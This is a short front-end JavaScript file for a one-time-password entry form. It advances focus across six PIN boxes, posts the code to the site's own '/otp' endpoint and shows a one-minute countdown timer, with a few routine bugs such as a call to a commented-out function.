const otpForm = document.querySelector(".otpForm");
const btn = document.querySelector("button");
// Function to check if the input is a valid 6-digit PIN
function isValidPIN(pin) {
  return /^\d{6}$/.test(pin);
}

// Function to change the button color
// function changeButtonColor(isFocused) {
//   var submitBtn = document.getElementById("submitBtn");
//   submitBtn.style.backgroundColor = isFocused ? "#0361f0" : ""; // Change the color as needed
//   submitBtn.style.color = isFocused ? "#fff" : ""; // Change the color as needed
// }

// Add event listeners to move the cursor to the next input field
var pinInputs = document.getElementsByClassName("pin-input");

for (var i = 0; i < pinInputs.length; i++) {
  pinInputs[i].addEventListener("input", function () {
    if (this.value.length === 1) {
      var nextInputIndex = Array.from(pinInputs).indexOf(this) + 1;
      if (nextInputIndex < pinInputs.length) {
        pinInputs[nextInputIndex].focus();
      } else {
        changeButtonColor(true); // Focus is on the last input
      }
    }
  });
}

// Add an event listener to reset the button color when any input loses focus
for (var i = 0; i < pinInputs.length; i++) {
  pinInputs[i].addEventListener("blur", function () {
    changeButtonColor(false);
  });
}

/// Loading in button
btn.onclick = () => {
  btn.disabled = true;
  btn.innerHTML = "Loading...";
};

// Function to collect and validate the PIN when the Submit button is clicked
document.getElementById("submitBtn").addEventListener("click", function () {
  var otp = "";
  var pinInputs = document.getElementsByClassName("pin-input");

  for (var i = 0; i < pinInputs.length; i++) {
    otp += pinInputs[i].value;
  }

  let formData = {
    otp: otp,
  };

  const handleFetchForm = async (res, req) => {
    const request = await fetch("/otp", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    });
    const response = await request.text();
    console.log(request.statusText);
    console.log(response);
    if (response == "success") {
      otp = "";
      location.href = "/otp";
    } else {
      console.log("error");
    }
  };
  handleFetchForm();
});

const timerElement = document.querySelector(".time p");

let minutes = 1;
let seconds = 0;

function updateTimer() {
  if (minutes === 0 && seconds === 0) {
    timerElement.textContent = "0:00";
    clearInterval(interval);
  } else {
    if (seconds === 0) {
      minutes--;
      seconds = 59;
    } else {
      seconds--;
    }

    const displayMinutes = minutes < 10 ? "0" + minutes : minutes;
    const displaySeconds = seconds < 10 ? "0" + seconds : seconds;
    timerElement.textContent = displayMinutes + ":" + displaySeconds;
  }
}

const interval = setInterval(updateTimer, 1000);
